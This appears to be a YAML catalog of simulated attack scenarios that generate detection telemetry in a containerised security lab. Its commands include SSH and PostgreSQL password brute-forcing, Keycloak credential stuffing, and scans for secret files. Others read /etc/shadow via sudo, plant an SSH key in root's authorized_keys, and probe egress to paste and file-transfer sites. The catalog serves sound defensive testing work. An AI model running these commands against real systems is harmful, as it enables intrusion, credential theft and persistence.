# Attack scenario catalog — batch 10 (docs/playground-environment-v2.md §Attack-simulation surface).
#
# Each scenario is a parameterized command sequence dispatched from a source
# host container against a target host. The runner (runner.py) executes
# steps via `docker --context soc-playground exec`, captures start/end
# timestamps + exit codes + truncated stdout/stderr per step, and writes a
# run manifest to attacks/runs/<run_id>/meta.json — raw material for the
# fixture-capture pass (batch 10b).
#
# Schema (per scenario):
#   id: unique slug, also the run_id prefix + seed axis.
#   category: auth-metadata | execution | data-access | exfiltration
#   description: short prose for catalog listing.
#   source_host: default docker container to dispatch from.
#   source_user: default identity (must exist on source_host — seeded by
#                hosts/base/seed-users.py from realm.yaml + inventory.yaml).
#   target_host: host the attack aims at (shows up as hostname in telemetry).
#   default_intensity: default for the ${intensity} placeholder + repeat count.
#   steps: list of command steps. Each step:
#     cmd: shell command. Template placeholders substituted before exec:
#            ${host}      → target_host (same as scenario.target_host)
#            ${target}    → target_host (alias; clearer when reading)
#            ${user}      → resolved source_user
#            ${iteration} → 0-indexed repeat counter
#            ${intensity} → resolved intensity
#     source_host: per-step override of scenario default.
#     source_user: per-step override (root means no -u flag on docker exec).
#     repeat: positive integer, or the literal string "${intensity}".
#     delay_s_between: seconds to sleep between repeats (skipped after last).
#     allow_fail: if true, non-zero rc does not abort the scenario.
#
# Retargeting: `--target` moves target_host (what ${target}/${host} expand to).
# `--source` moves source_host (where the commands run). A scenario whose steps
# interpolate ${target} SSHes source→target, so those two differ; a LOCAL scenario
# (its commands act on the host they run on and never read ${target}, e.g.
# persistence-authorized-keys, living-off-the-land, sudo-escalation-burst) retargets
# on --source, and its story/alert only stay coherent when --source and --target name
# the same host (the oracle-golden generator defaults --target to --source for these).
#
# Reproducibility: runner hashes (scenario.id, seed, step_index, iteration)
# to seed a per-step PRNG — same seed + same catalog → same dispatches.
#
# Baseline activity: leave it ON unless you are capturing an ALERT FIXTURE.
#
#   - capturing a fixture (a clean alert.json to replay offline): disabling the
#     generators (V2_BASELINE_ENABLED=false + compose up -d --force-recreate
#     <hosts>) keeps synthetic benign traffic out of the capture window. This is
#     what the original note here meant, and it is still right for that job.
#   - capturing for ORACLE CALIBRATION (defender/evals/oracle_golden/): leave the
#     generators running. The oracle's answer is a signed diff over baseline, so
#     with them off `+noise` cannot occur at all and `+event` is easier than
#     production — the suite would be calibrating against an environment that
#     does not exist. `generate_case.py` therefore runs with baseline on.
#
# `docs/runbook.md` (attack runs deliberately leave baseline on) is the newer
# statement and the one to follow by default.

scenarios:

  - id: ssh-brute-force-canary
    category: auth-metadata
    description: >
      Compromised office workstation hammers canary-1's SSH with wrong
      passwords from a non-privileged identity — classic rule-5710
      (SSH invalid-user / auth-failure) territory. The signal is the
      burst of failed auth events on canary-1's sshd.
    source_host: office-ws-1
    source_user: dev.dana
    target_host: canary-1
    default_intensity: 8
    steps:
      - cmd: |
          for pw in hunter2 password123 letmein admin secret qwerty; do
            sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
              -o ConnectTimeout=3 -o PreferredAuthentications=password \
              -o NumberOfPasswordPrompts=1 \
              root@${target} true 2>&1 | head -1 || true
          done
        repeat: "${intensity}"
        delay_s_between: 4
        allow_fail: true

  - id: living-off-the-land
    category: execution
    description: >
      Foothold on canary-1 runs a `curl | bash` chain plus a base64-decoded
      shell payload — exercises Falco's execution-lineage rules (shell
      spawned from non-shell parent, curl-to-bash piping, decoded script
      execution).
    source_host: canary-1
    source_user: root
    target_host: canary-1
    default_intensity: 1
    steps:
      - cmd: |
          curl -fsS http://web-1/ -o /tmp/fetched_${iteration}.sh 2>&1 || true
          # Not actually executing web-1's HTML as a script — just producing
          # the download+read-from-/tmp signal the telemetry cares about.
          bash -c "cat /tmp/fetched_${iteration}.sh | head -3" 2>&1 || true
        repeat: "${intensity}"
        allow_fail: true
      - cmd: |
          echo "IyEvYmluL2Jhc2gKZWNobyAicGxheWdyb3VuZCBhdHRhY2stc2ltIHJlYWNoZWQ6ICQobG9jYWx0aW1lKSIK" \
            | base64 -d > /tmp/payload_${iteration}.sh
          bash /tmp/payload_${iteration}.sh
        repeat: 1
        allow_fail: true

  - id: persistence-authorized-keys
    category: execution
    description: >
      Foothold on canary-1 appends an attacker SSH public key to
      /root/.ssh/authorized_keys — classic persistence via credential
      installation. Produces file-integrity (rule-550) + syscall (Falco
      write-below-etc / write-sensitive-file) signals.
    source_host: canary-1
    source_user: root
    target_host: canary-1
    default_intensity: 1
    steps:
      - cmd: |
          mkdir -p /root/.ssh && chmod 700 /root/.ssh
          ts=$(date +%s)
          echo "ssh-rsa AAAAB3NzaC1yc2EAAAAD_fake_key_${iteration}_${ts}_attacker attacker@elsewhere" \
            >> /root/.ssh/authorized_keys
          chmod 600 /root/.ssh/authorized_keys
          ls -la /root/.ssh/authorized_keys
        repeat: "${intensity}"
        delay_s_between: 2

  - id: cross-tier-ssh-probe
    category: data-access
    description: >
      Compromised office workstation attempts SSH to db-1 — office-ws has
      trust_edges_out: [] in inventory.yaml, so any auth attempt crosses a
      tier boundary that baseline traffic never crosses. The signal is
      cross-credential-anomaly regardless of whether auth succeeds.
    source_host: office-ws-1
    source_user: dev.dana
    target_host: db-1
    default_intensity: 4
    steps:
      - cmd: |
          sshpass -p changeme ssh -o StrictHostKeyChecking=no \
            -o ConnectTimeout=3 -o NumberOfPasswordPrompts=1 \
            dev.dana@${target} "id; hostname; ls /var/lib/postgresql 2>&1 | head -3" \
            2>&1 | head -5 || true
        repeat: "${intensity}"
        delay_s_between: 6
        allow_fail: true

  - id: postgres-cred-probe
    category: data-access
    description: >
      Compromised office workstation probes db-1's PostgreSQL directly — a burst
      of failed logins under guessed service accounts, then a data read with a
      weak app credential. office-ws has trust_edges_out: [] so no baseline path
      reaches the db tier, and the app's own DB traffic never fails auth; the
      signal is the `FATAL: password authentication failed` burst in
      logs-postgresql.log plus the off-tier SELECT. Reads ${target}, so it
      retargets to any postgres host.
    source_host: office-ws-1
    source_user: dev.dana
    target_host: db-1
    default_intensity: 5
    steps:
      - cmd: |
          for u in dbadmin backup pgadmin superuser reporting; do
            PGPASSWORD=Password123 psql -h ${target} -U "$u" -d postgres \
              -c 'SELECT 1' 2>&1 | head -1 || true
          done
        repeat: "${intensity}"
        delay_s_between: 5
        allow_fail: true
      - cmd: |
          PGPASSWORD=changeme psql -h ${target} -U appuser -d app \
            -c 'SELECT count(*) FROM orders;' \
            -c 'SELECT * FROM orders LIMIT 5;' 2>&1 | head -10 || true
        repeat: 1
        allow_fail: true

  - id: web-path-scan
    category: data-access
    description: >
      Compromised office workstation enumerates a web host for exposed admin
      panels, dotfiles and backups — a curl sweep of ~10 sensitive paths that all
      404. Baseline nginx traffic is health probes from 127.0.0.1 hitting two
      paths, so the distinguishing signal is a burst of distinct url.path 404s
      from an off-host source.ip in logs-nginx.access. Reads ${target}, so it
      retargets to any web host.
    source_host: office-ws-1
    source_user: dev.dana
    target_host: web-1
    default_intensity: 1
    steps:
      - cmd: |
          for path in /admin /.env /wp-login.php /api/v1/users /.git/config \
                      /phpmyadmin /server-status /config.php /backup.sql \
                      /.aws/credentials /actuator/health /.ssh/id_rsa; do
            curl -sS -m 3 -o /dev/null -w "%{http_code} ${path}\n" \
              "http://${target}${path}" 2>&1 || true
          done
        repeat: "${intensity}"
        delay_s_between: 3
        allow_fail: true

  - id: sudo-escalation-burst
    category: execution
    description: >
      Post-foothold interactive privilege probing on a single host — a burst of
      sudo invocations (successful or denied) reading sensitive files. Every
      execve of /usr/bin/sudo emits a Falco "Sudo execution" NOTICE; ≥3 on one
      host in 10 minutes trips v2-off-hours-sudo. LOCAL scenario: the commands run
      on the host itself, so it retargets on --source (source==target), not on
      --target.
    source_host: dev-ws-1
    source_user: dev.dana
    target_host: dev-ws-1
    default_intensity: 4
    steps:
      - cmd: |
          sudo -n id 2>&1 | head -1 || true
          sudo -n cat /etc/shadow 2>&1 | head -1 || true
        repeat: "${intensity}"
        delay_s_between: 20
        allow_fail: true

  - id: keycloak-cred-stuffing
    category: auth-metadata
    description: >
      Credential-stuffing against the Keycloak IdP — a burst of OIDC password
      grants under guessed usernames with a wrong password, each raising a
      LOGIN_ERROR in logs-keycloak.events. Baseline does not drive interactive IdP
      logins, so the error burst stands against a near-empty window. LOCAL scenario:
      it runs on the foothold and reaches the IdP by DNS (keycloak:8080). The IdP is
      a service, not a host role, and its events carry host.name=soc-playground, not
      a per-host identity — so the case names the ACTOR host and attributes by
      ipAddress/username in the lead. Retargets on --source (source==target), not
      --target.
    source_host: office-ws-1
    source_user: dev.dana
    target_host: office-ws-1
    default_intensity: 6
    steps:
      - cmd: |
          for user in admin sre.alice dev.dana svc.backups operator; do
            curl -sS -m 5 -o /dev/null -w "%{http_code} ${user}\n" \
              -d "client_id=admin-cli" -d "grant_type=password" \
              -d "username=${user}" -d "password=Password123!" \
              "http://keycloak:8080/realms/soc-playground/protocol/openid-connect/token" \
              2>&1 || true
          done
        repeat: "${intensity}"
        delay_s_between: 4
        allow_fail: true

  - id: proxy-egress-burst
    category: exfiltration
    description: >
      Authenticated egress through the Squid forward proxy under a compromised
      credential — a burst of outbound GET/CONNECT to external destinations, the
      shape of staged exfiltration or tool-download over the sanctioned proxy. Every
      request lands in logs-squid.access attributed to user.name (the basic-auth
      identity) with source.ip = the originating container; the destination is
      url.original. Baseline routes no egress through the proxy, so a single
      authenticated request already stands against an empty window. Runs FROM the
      compromised host outward to a fixed service, so it retargets on --source (the
      egressing host), not --target.
    source_host: office-ws-1
    source_user: dev.dana
    target_host: office-ws-1
    default_intensity: 8
    steps:
      - cmd: |
          for url in https://example.com https://ifconfig.me https://transfer.sh \
                     https://raw.githubusercontent.com https://pastebin.com \
                     https://api.telegram.org; do
            curl -sS -m 5 -o /dev/null -w "%{http_code} ${url}\n" \
              -x "http://dev.dana:changeme@squid:3128" "${url}" 2>&1 || true
          done
        repeat: "${intensity}"
        delay_s_between: 4
        allow_fail: true
